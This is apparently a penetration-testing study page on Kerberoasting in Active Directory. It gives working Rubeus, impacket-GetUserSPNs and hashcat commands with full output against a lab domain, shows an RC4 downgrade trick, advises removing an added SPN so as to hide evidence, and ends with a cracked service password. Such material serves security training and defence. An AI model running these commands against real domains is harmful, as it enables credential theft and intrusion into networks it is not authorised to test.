---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Kerberoasting

[**Kerberoasting**](https://blog.harmj0y.net/redteaming/kerberoasting-revisited/) is conceptually similar to [AS-REP Roasting](as-rep-roasting.md) except it attacks a `TGS-REP` ticket. Recall from [earlier](../#operation-details) the steps of authenticating to a service via Kerberos:

1. A user authenticates to the domain and receives a TGT (encrypted with the user's password)
2. The user uses their TGT to request a service ticket (`TGS-REQ`) from the domain controller (TGS)
   * Services are requested by SPN in the form `spn/host`
3. TGS issues a `TGS-REP` which is _encrypted with the password hash of the target service_ using the highest level of encryption both the service account and the client support
   * The "highest level of encryption" is based on the [`msDs-SupportedEncryptionTypes`](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) property of the service and client accounts.
4. User submits the `TGS-REP` to the service and is granted access

If an attacker has a valid TGT (e.g. if they have access to a compromised account), they can submit a `TGS-REQ` and get a valid `TGS-REP`. This can then be cracked offline.

This technique is immensely powerful if the domain contains high-privilege service accounts with weak passwords, which is not uncommon in many organizations. However, if the SPN _runs in the context of a computer account, a managed service account, or a group-managed service account_, the password will be randomly generated, complex, and 120 characters long, making cracking infeasible. The same is true for the `krbtgt` user account which acts as service account for the KDC. Therefore, the chances of performing a successful Kerberoast attack against SPNs running in the context of user accounts is much higher.

If a user has `GenericWrite` or `GenericAll` permissions on another AD user account.they could reset the user's password, though this may raise suspicion. Alternatively, with the same permissions, an attacker could [set an SPN](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241\(v=ws.11\)) for the user, kerberoast the account, and crack the password hash in an attack named **targeted Kerberoasting**. After cracking one should remove the added SPN to avoid leaving evidence or potential vulnerabilites that could be exploited by someone else.

## Obtaining the Hash

### Rubeus

Much as Rubeus [can be used](as-rep-roasting.md#rubeus) for AS-REP Roasting it can be used for Kerberoasting with the `kerberoast` command:

```sh
Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.kerberoast
```

* `/tgtdelg` is Rubeus's implementation of [Kekeo's tgtdeleg](https://github.com/gentilkiwi/kekeo/blob/4fbb44ec54ff093ae0fbe4471de19681a8e71a86/kekeo/modules/kuhl\_m\_tgt.c#L189-L327) trick
  * It uses the Kerberos GSS-API to request a “fake” delegation for a target SPN that has unconstrained delegation enabled. This approach allows attackers to extract a usable TGT for the current user, including the session key.
  * As described in this [blog post](https://blog.harmj0y.net/redteaming/kerberoasting-revisited/) (also linked above) this basically has the effect of allowing the attacker to artificially lower the "highest supported encryption level." This sets the `msDs-SupportedEncryptionTypes` to 23 which forces it to RC4. RC4 is much easier to crack than AES
* `/outfile` tells the tool to place the hashes in an output file named `hashes.kerberoast`

When run it find the `iis_service` account is vulnerable to Kerberoasting and it places the hash in the specified file:

```shell-session
C:\Users\jeff>.\Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.kerberoast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Kerberoasting

[*] Using 'tgtdeleg' to request a TGT for the current user
[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else
[*] Target Domain          : corp.com
[+] Ticket successfully imported!
[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : iis_service
[*] DistinguishedName      : CN=iis_service,CN=Users,DC=corp,DC=com
[*] ServicePrincipalName   : HTTP/web04.corp.com:80
[*] PwdLastSet             : 9/7/2022 5:38:43 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\jeff\hashes.kerberoast

[*] Roasted hashes written to : C:\Users\jeff\hashes.kerberoast
```

{% code title="hashes.kerberoast" %}
```
$krb5tgs$23$*iis_service$CORP.COM$HTTP/web04.corp.com:80*$57AD54174C7B899477835E0359644B4E$E614816312F43E79DFB3D40682F22A8FFA857C1533CA986E3ED85D93461908BA7C7E7CCBA7A159C27E22D51FAB9C911A7AD03D7D8171267EDAF0E71E0DF93A0DC798A3B5A67CC401C834D992B35CF6A80DF7F623717BEE13037E17347263179CFB76F701D8DCEB1A08592108163CF1EDB65C718DB25592000EC3B3B69C54CF5F18741F530C5D65C52245B115B348C4A0E613EF43B527E1B27A60F00EFB8060853BCAA61086D6CB5C491573E3E2E503820ED67C2CCB77C5C3EB0840C807DED0C7C07B977BE28D47E173A4CE29093C6D8DD14CDFFA7A8692F91861EAF19EF6E789BAD17C937B00BB429180AE34D8EA868F642CF79A50C3E49E32D792045F02D0A539402E57D76B16E55D2090BA317C5A65DAB1F413631C71E4C4878D9A4143C911A5F2AE97D9D03B7297D41991A98E01787D29143D3BD97AF9494B76BA3725855CEF42C1A95DC62817354ED03336755F9CFBDD2DF48BC28C3582BC85572503C0CEB433EF30DADD605DBDB81DECBF7FD57327411EE7603B2096A91065C4B4E09F019D1D11B3F2778B2C0B2599017EA473C338D05B5840FED4E1892435D69511E07DC37016EFDD8F41FBBAF78C5E7C725C796A727681AE04F8F4C32C6A98C930535E6F6443E84479A0335920CB3F4E889CB92DD019D763CFA3FBA571C124003E28ACD660FBA575B2E74AA5779AAD8343832538C6F11B5360CCC065F64FF65AB3B4E738A79FF71DF26C957668E825A03CC07D1BC3828A057336E7C7B0FFE0F9D3D0AB863C9B0B1741BB71DB8C4CBB336B23F8899A7DF52E694F9C982EDAD3AE7A8E7C1A29634F926BB357938C4F2A544A760BBE51354C8FE925280899F24DFC4FE0D5D0A54D5028987778BB929133748886466A2196110921722D1D197A92F254A79C6B3EC1D0EA8E93AD22F8519882BB69DFC303D35FA68827CBE557BBDC6746334D02175B02B8001D9296814CA70701A8049CA33A8348A8A7970EB47389EDF60A9E0550A233C86C406CCE5884074F5143825B75D542E77500C3FC8BE0D3766BC2CA2297F5E835F7CBA931BF4FB02ADA77B8CF17B8825EB840353E64C2272C64602E407CCE0BAC572E0156FA0268CA7C6D5DF82C370C64F4C475065F9DF826FD030E048540AE9EDCA8C4BEC9A1D3D98DF24DAE3F1C51CEF0B989044900C3AF829BB4193EF1AEA3C92F2FD970B120F3C207D5A6DE2DEF5F5416660433192CDB31D90408F900BE733CCB140E4364D89867FC8F5AF2E35E8B5414128256067EBDCCD4FF44EED2101DB29611F145B33E3191CA9F8ABEE5EA8F6ECA45F53346B319620563DEB7B275219D82E270574FB86D
```
{% endcode %}

Note in the hash that type is set to 23 (`$23` second field) indicating the `/tgtdeleg` trick was successful in getting it down to RC4.

### Impacket

[Impacket](as-rep-roasting.md#impacket) also offers a [`GetUserSPNs`](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) script which can be used to obtain a TGS-REP. The command to obtain a ticket with this tool is:

```bash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/jeff
```

* `-request` is used to request the ticket and output it in a usable format
* `-dc-ip` specifies the domain controller's IP
* `corp.com/jeff` is the user that the attacker has access to and can authenticate as to obtain a valid TGT

When run it reveals the same hash as found via Rubeus:

```shell-session
kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.192.70 corp.com/jeff
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
ServicePrincipalName    Name         MemberOf  PasswordLastSet             LastLogon                   Delegation    
----------------------  -----------  --------  --------------------------  --------------------------  -------------
HTTP/web04.corp.com:80  iis_service            2022-09-07 06:38:43.411468  2023-03-01 04:40:02.088156  unconstrained 



[-] CCache file is not found. Skipping...
$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$a6d8a94106914d7d789753d7e68a8664$5dba896074545add30be52e021954d21da4cc262882cceaeb19208be7234541db8a59a09fd90dc2c291289b2b33f539413fbe7d3bcc2100ab1e0b60dd833ef7b2579b5872b3c99ca7435cf9de4fffd8ad0bc23f4f8158636886f4d06e039adef7999f807fec8d33aeddc72ce8f69717d6d89b20ef1aa55438da1e1783702227d573b4084dc1ef01a0517b07ce894362049931649474dd1c3171e8c450522868b47e1da3f7aea559ab6cfffd07f495ed3ccf62238cf7b2e1edf11dd60c98880d1a96509ad0187f313914981cd45d31ea66a13172feee2150111d519669c77164f144587e239013e6e568dc0f6b804dda767a0317d5b3a25bd23806bb79cd8ab7d7bf50a47964aebe598bb83be8225c962e5ce45a3eae86fea2899fb33c02fce77a75aaac5780277cd43c75a8df26508539475c09bbb11fa79316c38d4abbc6dba7b1d65bf15b23f1a304baf0e0837187716506ecb8bd111966128a44c8d425e74bca631a4c5f452867b28cfd6e9f396c8bbec1639b55e4833e43cdcca3038cc15ed4120ba2b0342466b2c3e8cd9dedbb0d40c8174f9201032c341b6e186777fe0f441157ad195acdd572e0c87e93e8c05526bc4cfca65ac585b54e5475d44b91b36b8300f7982a365cacc8dd2d41922096638d8fc4a4cbe6a8d0d5d0680dd5184622859670a2cfdf20b0b585983c3957e6c146042e7a5d4f8a06d3728373328188bc25440016e89a2ea962da7632a359b14480c7fc936f6c5acd5f103008bda8641da148f500090a1ac8a7a77c88aa6aabfb4f1c220a9740e2fa58614e0e1f60915d1832681795c176c7e9b8942e3ee281767fed68ac6630d3a7750f9c43ce5797228eab928821d58bcab6a98fd29ccaa80ca47f1bba567e67dd67fceb2727be2512d78dba03e0ec346a70a60ff24d405fe89a80f969073067bb660fedae41c0e6e971b136cf537b7c62dc1e6f4935b3c415db98c5649d87e694ee04381fe7820b323235a7c508945ad2ae188149d06fd0ef8bdb9f0cc3594b0dc666b9329409827d5facc792280411827d0f35e87124f7d51042a9c9d8915174814329ffba6526718b1b418bc5c0ae17b3705aa1b2faff6ba4a9a578d90f33588520857aa6227a7e04332adc3021a56df153ac03cfd1ae8ab3c89e63fc78694115242d8474fdd6bf68b8df059b2f5b5ef0344f554dbd903587319d991a1da53f13ac4c8091483269ee1f29c19b7791bbd52cdb9284eb492686195d90a05557e7041a9c817e44991977f5d9b2e20659f2664ad5b2123ba7951971183aee20cdc3b6e6d220c9e6f4296330f9a17a676412495e293
```

Note that Impacket has both an upside and downside. The upside is it can be run from an attacker's Kali machine. The downside is that it does not offer the same TGT delegation feature as Rubeus (`/tgtdelg`) allowing the attacker to get a TGS-REP encrypted with the weaker RC4. In this instance it does not matter because the example was set up to be easy but in the real world the `/tgtdeleg` flag can be the difference between obtaining a crackable or uncrackable hash.

#### Time Synchronization

If `impacket-GetUserSPNs` throws the error "`KRB_AP_ERR_SKEW(Clock skew too great)`" the attacker needs to synchronize the time of their Kali machine with the domain controller. This can be done using [`ntpdate`](https://linux.die.net/man/8/ntpdate) or [`rdate`](https://linux.die.net/man/1/rdate).

## Cracking the Hash

Once again, Hashcat will be used to crack the hash. To find the mode keep in mind that the attacker has obtained a TGS-REP with encryption type 23:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>kali@kali:~$ hashcat --help | grep Kerberos
</strong>  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
</code></pre>

With that information in mind, `13100` seems to be the proper attack mode. The hash will be cracked with the command:

{% code overflow="wrap" %}
```bash
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
{% endcode %}

As seen in the output below it reveals the `iis_service` password to be `Strawberry1`:

```shell-session
kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule        
[sudo] password for kali: 
hashcat (v6.2.6) starting

...

$krb5tgs$23$*iis_service$CORP.COM$HTTP/web04.corp.com:80*$57ad54174c7b899477835e0359644b4e$e614816312f43e79dfb3d40682f22a8ffa857c1533ca986e3ed85d93461908ba7c7e7ccba7a159c27e22d51fab9c911a7ad03d7d8171267edaf0e71e0df93a0dc798a3b5a67cc401c834d992b35cf6a80df7f623717bee13037e17347263179cfb76f701d8dceb1a08592108163cf1edb65c718db25592000ec3b3b69c54cf5f18741f530c5d65c52245b115b348c4a0e613ef43b527e1b27a60f00efb8060853bcaa61086d6cb5c491573e3e2e503820ed67c2ccb77c5c3eb0840c807ded0c7c07b977be28d47e173a4ce29093c6d8dd14cdffa7a8692f91861eaf19ef6e789bad17c937b00bb429180ae34d8ea868f642cf79a50c3e49e32d792045f02d0a539402e57d76b16e55d2090ba317c5a65dab1f413631c71e4c4878d9a4143c911a5f2ae97d9d03b7297d41991a98e01787d29143d3bd97af9494b76ba3725855cef42c1a95dc62817354ed03336755f9cfbdd2df48bc28c3582bc85572503c0ceb433ef30dadd605dbdb81decbf7fd57327411ee7603b2096a91065c4b4e09f019d1d11b3f2778b2c0b2599017ea473c338d05b5840fed4e1892435d69511e07dc37016efdd8f41fbbaf78c5e7c725c796a727681ae04f8f4c32c6a98c930535e6f6443e84479a0335920cb3f4e889cb92dd019d763cfa3fba571c124003e28acd660fba575b2e74aa5779aad8343832538c6f11b5360ccc065f64ff65ab3b4e738a79ff71df26c957668e825a03cc07d1bc3828a057336e7c7b0ffe0f9d3d0ab863c9b0b1741bb71db8c4cbb336b23f8899a7df52e694f9c982edad3ae7a8e7c1a29634f926bb357938c4f2a544a760bbe51354c8fe925280899f24dfc4fe0d5d0a54d5028987778bb929133748886466a2196110921722d1d197a92f254a79c6b3ec1d0ea8e93ad22f8519882bb69dfc303d35fa68827cbe557bbdc6746334d02175b02b8001d9296814ca70701a8049ca33a8348a8a7970eb47389edf60a9e0550a233c86c406cce5884074f5143825b75d542e77500c3fc8be0d3766bc2ca2297f5e835f7cba931bf4fb02ada77b8cf17b8825eb840353e64c2272c64602e407cce0bac572e0156fa0268ca7c6d5df82c370c64f4c475065f9df826fd030e048540ae9edca8c4bec9a1d3d98df24dae3f1c51cef0b989044900c3af829bb4193ef1aea3c92f2fd970b120f3c207d5a6de2def5f5416660433192cdb31d90408f900be733ccb140e4364d89867fc8f5af2e35e8b5414128256067ebdccd4ff44eed2101db29611f145b33e3191ca9f8abee5ea8f6eca45f53346b319620563deb7b275219d82e270574fb86d:Strawberry1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*iis_service$CORP.COM$HTTP/web04.corp.c...4fb86d
...

Started: Thu Mar 28 13:36:15 2024
Stopped: Thu Mar 28 13:36:50 2024
```
